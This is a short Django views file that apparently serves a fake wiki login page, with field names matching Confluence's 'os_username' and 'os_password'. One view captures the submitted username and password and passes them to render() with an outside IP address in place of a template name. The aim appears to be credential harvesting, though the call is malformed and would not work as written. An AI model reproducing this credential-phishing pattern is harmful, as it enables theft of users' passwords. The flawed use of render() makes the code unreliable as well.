from django.http import HttpResponse
from django.shortcuts import render


# Create your views here.

def hello_world(request):

    return render(request, 'accountapp/wiki.html')

def redirect_404(request):    
    if request.method == "POST":
        temp = request.POST.get('os_username')    
        temp2 = request.POST.get('os_password')


        return render(request, 'http://3.37.52.97', context={'text': temp, 'text2': temp2})
    else:         
        temp = request.GET.get('os_username')    
        temp2 = request.GET.get('os_password')

        return render(request, 'http://3.37.52.97', context={'text': temp, 'text2': temp2})